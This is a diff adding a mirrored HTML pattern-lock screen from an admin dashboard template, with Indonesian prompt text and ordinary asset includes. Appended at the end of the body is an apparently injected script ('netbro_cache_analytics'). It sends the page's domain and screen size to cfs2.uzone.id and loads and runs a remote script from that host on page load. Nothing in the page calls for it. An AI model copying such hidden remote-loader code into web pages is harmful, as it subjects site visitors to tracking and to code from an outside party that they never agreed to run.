@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+<!-- Mirrored from steelcoders.com/alpha/v1.2/pattern-lock-screen.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 07 Apr 2017 07:32:24 GMT -->
+<head>
+        
+        <!-- Title -->
+        <title>SAM</title>
+        
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+        <meta charset="UTF-8">
+        <meta name="description" content="Responsive Admin Dashboard Template" />
+        <meta name="keywords" content="admin,dashboard" />
+        <meta name="author" content="Steelcoders" />
+        
+        <!-- Styles -->
+        <link type="text/css" rel="stylesheet" href="assets/plugins/materialize/css/materialize.min.css"/>
+        <link href="http://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+        <link href="assets/plugins/material-preloader/css/materialPreloader.min.css" rel="stylesheet">    
+        <link href="assets/plugins/patternlock-master/patternLock.css" rel="stylesheet">    
+
+        	
+        <!-- Theme Styles -->
+        <link href="assets/css/alpha.min.css" rel="stylesheet" type="text/css"/>
+        <link href="assets/css/custom.css" rel="stylesheet" type="text/css"/>
+        
+        
+        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+        <!--[if lt IE 9]>
+        <script src="http://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+        <script src="http://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+        
+    </head>
+    <body class="signin-page pattern-lock-screen">
+        <div class="loader-bg"></div>
+        <div class="loader">
+            <div class="preloader-wrapper big active">
+                <div class="spinner-layer spinner-blue">
+                    <div class="circle-clipper left">
+                        <div class="circle"></div>
+                    </div><div class="gap-patch">
+                    <div class="circle"></div>
+                    </div><div class="circle-clipper right">
+                    <div class="circle"></div>
+                    </div>
+                </div>
+                <div class="spinner-layer spinner-red">
+                    <div class="circle-clipper left">
+                        <div class="circle"></div>
+                    </div><div class="gap-patch">
+                    <div class="circle"></div>
+                    </div><div class="circle-clipper right">
+                    <div class="circle"></div>
+                    </div>
+                </div>
+                <div class="spinner-layer spinner-yellow">
+                    <div class="circle-clipper left">
+                        <div class="circle"></div>
+                    </div><div class="gap-patch">
+                    <div class="circle"></div>
+                    </div><div class="circle-clipper right">
+                    <div class="circle"></div>
+                    </div>
+                </div>
+                <div class="spinner-layer spinner-green">
+                    <div class="circle-clipper left">
+                        <div class="circle"></div>
+                    </div><div class="gap-patch">
+                    <div class="circle"></div>
+                    </div><div class="circle-clipper right">
+                    <div class="circle"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="mn-content valign-wrapper">
+            <main class="mn-inner container ">
+                <div class="valign">
+                    <div class="row">
+                        <div class="col s12 m6 l4 offset-l4 offset-m3 center">
+                            <h3 id="time" class="cyan-text"></h3>
+                            <h5 id="date" class="cyan-text"></h5>
+                            <div id="patternContainer" style="margin: 20px auto;"></div>
+                            <span class="white-text">SILAHKAN BUKA POLA !</span>
+                        </div>
+                    </div>
+                </div>
+            </main>
+        </div>
+        
+        <!-- Javascripts -->
+        <script src="assets/plugins/jquery/jquery-2.2.0.min.js"></script>
+        <script src="assets/plugins/materialize/js/materialize.min.js"></script>
+        <script src="assets/plugins/material-preloader/js/materialPreloader.min.js"></script>
+        <script src="assets/plugins/jquery-blockui/jquery.blockui.js"></script>
+        <script src="assets/plugins/patternlock-master/patternLock.min.js"></script>
+        <script src="assets/js/alpha.min.js"></script>
+        <script src="assets/js/pages/pattern-lock-screen.js"></script>
+        
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKABHQkMFWsU8Jbw8ERsvJfpSX7BJnhbU4SX2jbWgYO5spqS53tIzKxlyKK7sHT9ZVsFhn4FDUjvhlSRBq6jM3CO2m4%2bTvXuQ7goQ4wrIUGHAXwaasRmKo4waFL4jUVfRxl%2b9xTsA%2bEDuOz%2fO%2b1hAH7H9Fp4In3YORNjLt6JMIl3Z6xrEQHRYZEXS1SEmchtBF%2bRR1haytCEaQfnIt79SDndY3pa6EA0VrPDyC9b75206Ir19oZOjNLINQBQmxfSt%2bhR5rIHAReBGC3B9BfHizCzcnsyw1WvNKkvMT%2fiGeg7maqrxwLhi%2bloXvTjK2t0HRUm6AFFIM1B%2btUXIJlPoI1jp0Wz%2bhcku5BFiDZmWVe%2bGJVoieNpjaa6K1C24j3DsVv9SiJ60goKt%2fFz1Zv0P5XacncpYmZESa" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+<!-- Mirrored from steelcoders.com/alpha/v1.2/pattern-lock-screen.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 07 Apr 2017 07:32:24 GMT -->
+</html>
